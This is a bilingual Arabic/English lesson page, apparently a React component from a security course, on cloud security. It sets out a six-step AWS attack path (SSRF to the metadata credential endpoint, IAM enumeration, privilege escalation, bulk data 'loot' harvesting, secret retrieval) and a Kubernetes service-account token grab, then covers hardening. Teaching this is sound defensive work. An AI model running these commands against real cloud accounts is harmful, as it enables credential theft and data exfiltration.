"use client";
import { LessonShell, Section, Callout, Code, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="cloud">
      <L
        ar={<>
          <Section title="ليه السحابة هدف رقم واحد دلوقتي؟">
            <Analogy>
              - طب السحابة &quot;آمنة&quot; صح يا حضرتك؟؟ AWS و Azure شايلين الموضوع!

              ها ها ها يا نجم الجيل.. طب أمازون اتخرقت قبل كده؟ ليه إذن؟

              السحابة زي برج فيه ألف مكتب، وكل صاحب مكتب بيركب قفله بإيده. واحد ركّب قفل ضعيف؟ اللص بيدخل مكتبه من غير ما حد ياخد باله، ومن هناك بيوصل لأبواب داخلية في البرج كله.

              أكتر من 80٪ من اختراقات السحابة سببها سوء تكوين. مش ثغرة برمجية. مش zero-day. <b>سوء تكوين</b>.

              Capital One 2019: SSRF واحدة وصلت للـ IMDSv1. 100 مليون عميل. غرامة 80 مليون دولار. ولسه في 2026 شركات شغّالة على IMDSv1.
            </Analogy>
          </Section>
          <Section title="نموذج المسؤولية المشتركة">
            <p>
              <b>الـ Cloud Provider</b> مسؤول عن أمن السحابة — الأجهزة، الـ hypervisor، الداتا سنتر.
              <br/>
              <b>إنت</b> مسؤول عن الأمن جوه السحابة — الـ IAM، التكوين، الداتا، الشبكة.
              <br/>
              لما حد يقولك "AWS اتخرقت"، اسأله سؤال واحد: "اتخرق إيه بالظبط؟" في 99٪ من الحالات، AWS ما اتخرقتش. عميل من عملاءها سايب bucket public.
            </p>
          </Section>
          <Section title="اوعى تعمل الغلطات دي">
            <Callout kind="warn" title="اللي كل واحد جديد بيقع فيه">
              <ul>
                <li>يعمل IAM user ويديه AdministratorAccess "علشان أجرّب بسرعة". ينسى يشيلها.</li>
                <li>يحط access keys في الـ git repo. يعمل push. ينسى. بعد 4 شهور يلاقي bill بـ 50 ألف دولار.</li>
                <li>يفعّل CloudTrail بس في region واحدة. باقي الـ regions blind.</li>
                <li>يفتكر إن "S3 bucket private" يعني "آمن"، وينسى الـ presigned URLs والـ bucket policies المتعارضة.</li>
                <li>يستخدم نفس الـ IAM role للـ dev والـ prod. أول compromise، الـ blast radius كله الإنتاج.</li>
              </ul>
            </Callout>
          </Section>
          <Section title="AWS Attack Path — مسار هجوم نموذجي">
            <Step n={1} title="جمع المعلومات">
              <Code lang="bash">{`aws s3 ls s3://target-backups --no-sign-request
amass enum -d target.gov -src
crt.sh → *.elb.amazonaws.com baring target name`}</Code>
            </Step>
            <Step n={2} title="مفاتيح مسربة من GitHub">
              <Code lang="bash">{`gitleaks detect --source=. --report-format=json
trufflehog github --org=target --only-verified
aws sts get-caller-identity --profile leaked`}</Code>
            </Step>
            <Step n={3} title="استغلال SSRF عشان توصل للـ IMDS">
              <Code lang="payload">{`GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
{"AccessKeyId":"ASIA...","SecretAccessKey":"abc...","Token":"FQoG..."}`}</Code>
              <Callout kind="danger" title="الفرق بين IMDSv1 وv2">IMDSv2 بيتطلب توكن PUT وبيمنع الـ SSRF الكلاسيكي. <b>فعّله إجبارياً (HttpTokens=required)</b>.</Callout>
            </Step>
            <Step n={4} title="عدّ صلاحيات الـ IAM">
              <Code lang="bash">{`aws sts get-caller-identity
aws iam list-user-policies --user-name $U
aws iam simulate-principal-policy --policy-source-arn ... --action-names "*"
pacu
cloudfox aws inventory --profile pwned
enumerate-iam --access-key ... --secret-key ...`}</Code>
            </Step>
            <Step n={5} title="رفع الصلاحيات — Privilege Escalation">
              <ul>
                <li>iam:CreateAccessKey على يوزر تاني.</li>
                <li>iam:AttachUserPolicy → ربط AdministratorAccess.</li>
                <li>iam:PassRole + ec2:RunInstances = شغل EC2 بدور أعلى.</li>
                <li>lambda:UpdateFunctionCode على Lambda معاها دور أعلى.</li>
                <li>sts:AssumeRole مع trust policy بايظ.</li>
              </ul>
            </Step>
            <Step n={6} title="حصاد الداتا">
              <Code lang="bash">{`aws s3 sync s3://target-backups ./loot/
aws rds describe-db-snapshots
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path /prod --with-decryption`}</Code>
            </Step>
          </Section>
          <Section title="الغلطات الأكثر شيوعاً في AWS">
            <TwoCol>
              <Card title="S3 Public Buckets" color="red">aws s3api put-bucket-acl --acl public-read = كارثة. فعّل Block Public Access على مستوى الحساب.</Card>
              <Card title="Wildcard في الـ IAM" color="red">"Action":"*","Resource":"*" = صلاحية كاملة. استخدم Access Analyzer عشان تكشفها.</Card>
              <Card title="Security Groups مفتوحة" color="red">0.0.0.0/0:22 أو :3389 = هدف لـ brute force. استخدم SSM Session Manager بدل SSH.</Card>
              <Card title="CloudTrail مقفول" color="red">من غير CloudTrail + GuardDuty مش هتعرف أصلاً إنك اتخرقت.</Card>
            </TwoCol>
          </Section>
          <Section title="Azure / GCP باختصار">
            <h3>Azure</h3>
            <ul>
              <li>هجمات على Entra ID (Azure AD) — device code phishing, illicit consent.</li>
              <li>الأدوات: ROADtools, AADInternals, MicroBurst.</li>
              <li>Managed Identity = نسخة الـ IMDS في Azure (169.254.169.254).</li>
            </ul>
            <h3>GCP</h3>
            <ul>
              <li>الـ Service Accounts = أكبر بقعة مكشوفة.</li>
              <li>iam.serviceAccountTokenCreator + actAs = privesc.</li>
              <li>الأدوات: GCPBucketBrute, gcloud-pwn, hayat.</li>
            </ul>
          </Section>
          <Section title="Kubernetes — السحابة جوه السحابة">
            <ul>
              <li>kubelet مفتوح بدون authn؟ كارثة كاملة.</li>
              <li>RBAC فيه cluster-admin لكل ServiceAccount.</li>
              <li>صور حاويات فيها ثغرات (استخدم trivy عشان تفحصها).</li>
              <li>pod بـ privileged: true = خروج للـ node نفسها.</li>
            </ul>
            <Code lang="kubectl from inside compromised pod">{`cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list
peirates`}</Code>
          </Section>
          <Section title="الحماية السحابي — Cloud Hardening">
            <ol>
              <li><b>CSPM</b> (Prisma Cloud, Wiz, AWS Security Hub) عشان يكشف سوء التكوين أوتوماتيك.</li>
              <li><b>CIEM</b> لتحليل صلاحيات IAM الزيادة.</li>
              <li><b>SCPs</b> لمنع الأفعال الخطرة على مستوى المؤسسة.</li>
              <li>CloudTrail + GuardDuty + Detective.</li>
              <li>طبّق AWS Foundational Security Best Practices + CIS AWS Benchmark.</li>
              <li>IMDSv2 إجبارياً + اقفل الـ public IP افتراضياً.</li>
              <li>شفّر كل EBS وS3 وRDS بـ KMS + فعّل MFA Delete.</li>
              <li>Just-In-Time access عن طريق AWS SSO / PIM.</li>
            </ol>
            <Callout kind="good" title="حسبة سريعة">لو قللت صلاحيات الـ IAM للـ least privilege، إنت بتوقف 90% من مسارات الـ privesc المعروفة. لازمة المراهنة دي.</Callout>
          </Section>
          <Section title="الخلاصة الناشفة">
            <p>السحابة مش بتتخرق بـ zero-day.</p>
            <p>بتتخرق بـ access key مسرّب على GitHub، و bucket public، و IAM policy فيها wildcard اتكتب في 2020 ومحدش فاكرها.</p>
            <p>المستجد بيدوّر على CVE في AWS. مفيش CVE يا نجم.</p>
            <p>المحترف بيدوّر على configuration drift، وسطر <code>Action: &quot;*&quot;</code> اتسحب من Stack Overflow وانحط في prod.</p>
            <p>اكتبها على ظهر إيدك واسأل نفسك كل صبح:</p>
            <p><b>&quot;لو الـ access key ده اتسرّب دلوقتي، البلاست راديوس قده إيه؟&quot;</b></p>
            <p>لو الإجابة &quot;كل الـ tenant&quot;، يبقى المعمار غلط. مش الموضوع EDR ومراقبة. الموضوع least privilege من الأول.</p>
          </Section>
        </>}
        en={<>
          <Section title="Why is the cloud target #1 today?">
            <Analogy>The cloud is like a tower with a thousand offices, but each tenant installs their own lock. If anyone uses a weak lock, a thief slips into their office unnoticed and from there reaches internal doors of the whole tower. <b>Over 80% of cloud breaches are misconfigurations</b>, not zero-days.</Analogy>
          </Section>
          <Section title="The shared responsibility model">
            <p>The <b>cloud provider</b> is responsible for <i>security OF the cloud</i> (hardware, hypervisor). <b>You</b> are responsible for <i>security IN the cloud</i> (IAM, configuration, data).</p>
          </Section>
          <Section title="AWS attack path — a typical chain">
            <Step n={1} title="Information gathering">
              <Code lang="bash">{`aws s3 ls s3://target-backups --no-sign-request
amass enum -d target.gov -src
crt.sh → *.elb.amazonaws.com baring target name`}</Code>
            </Step>
            <Step n={2} title="Leaked keys from GitHub">
              <Code lang="bash">{`gitleaks detect --source=. --report-format=json
trufflehog github --org=target --only-verified
aws sts get-caller-identity --profile leaked`}</Code>
            </Step>
            <Step n={3} title="Use SSRF to hit IMDS">
              <Code lang="payload">{`GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
{"AccessKeyId":"ASIA...","SecretAccessKey":"abc...","Token":"FQoG..."}`}</Code>
              <Callout kind="danger" title="IMDSv1 vs v2">IMDSv2 requires a PUT token and blocks classic SSRF. <b>Enforce it (HttpTokens=required)</b>.</Callout>
            </Step>
            <Step n={4} title="Enumerate IAM permissions">
              <Code lang="bash">{`aws sts get-caller-identity
aws iam list-user-policies --user-name $U
aws iam simulate-principal-policy --policy-source-arn ... --action-names "*"
pacu
cloudfox aws inventory --profile pwned
enumerate-iam --access-key ... --secret-key ...`}</Code>
            </Step>
            <Step n={5} title="Privilege escalation">
              <ul>
                <li>iam:CreateAccessKey on another user.</li>
                <li>iam:AttachUserPolicy → attach AdministratorAccess.</li>
                <li>iam:PassRole + ec2:RunInstances = launch EC2 with a higher role.</li>
                <li>lambda:UpdateFunctionCode on a Lambda with a higher role.</li>
                <li>sts:AssumeRole with a sloppy trust policy.</li>
              </ul>
            </Step>
            <Step n={6} title="Data harvesting">
              <Code lang="bash">{`aws s3 sync s3://target-backups ./loot/
aws rds describe-db-snapshots
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path /prod --with-decryption`}</Code>
            </Step>
          </Section>
          <Section title="The most common AWS mistakes">
            <TwoCol>
              <Card title="Public S3 buckets" color="red">aws s3api put-bucket-acl --acl public-read = disaster. Enable account-level Block Public Access.</Card>
              <Card title="IAM wildcards" color="red">"Action":"*","Resource":"*" = full power. Use Access Analyzer to surface them.</Card>
              <Card title="Open security groups" color="red">0.0.0.0/0:22 or :3389 invites brute force. Use SSM Session Manager instead of SSH.</Card>
              <Card title="CloudTrail off" color="red">Without CloudTrail + GuardDuty, you won't know you've been breached.</Card>
            </TwoCol>
          </Section>
          <Section title="Azure / GCP in brief">
            <h3>Azure</h3>
            <ul>
              <li>Attacks on Entra ID (Azure AD) — device code phishing, illicit consent.</li>
              <li>Tools: ROADtools, AADInternals, MicroBurst.</li>
              <li>Managed Identity = Azure's IMDS equivalent (169.254.169.254).</li>
            </ul>
            <h3>GCP</h3>
            <ul>
              <li>Service Accounts = the largest attack surface.</li>
              <li>iam.serviceAccountTokenCreator + actAs = privesc path.</li>
              <li>Tools: GCPBucketBrute, gcloud-pwn, hayat.</li>
            </ul>
          </Section>
          <Section title="Kubernetes — cloud inside the cloud">
            <ul>
              <li>kubelet exposed with no authn? Disaster.</li>
              <li>RBAC granting cluster-admin to every ServiceAccount.</li>
              <li>Container images full of CVEs (scan with trivy).</li>
              <li>A pod with privileged: true = breakout to the node.</li>
            </ul>
            <Code lang="kubectl from inside a compromised pod">{`cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list
peirates`}</Code>
          </Section>
          <Section title="Cloud hardening — defense">
            <ol>
              <li><b>CSPM</b> (Prisma Cloud, Wiz, AWS Security Hub) for automated misconfig detection.</li>
              <li><b>CIEM</b> to analyze excess IAM permissions.</li>
              <li><b>SCPs</b> to forbid dangerous actions org-wide.</li>
              <li>CloudTrail + GuardDuty + Detective.</li>
              <li>Apply AWS Foundational Security Best Practices + the CIS AWS Benchmark.</li>
              <li>Enforce IMDSv2 + disable public IP by default.</li>
              <li>Encrypt every EBS, S3, RDS with KMS + enable MFA Delete.</li>
              <li>Just-In-Time access via AWS SSO / Azure PIM.</li>
            </ol>
            <Callout kind="good" title="Quick math">Reducing IAM down to least privilege blocks 90% of known privesc paths.</Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
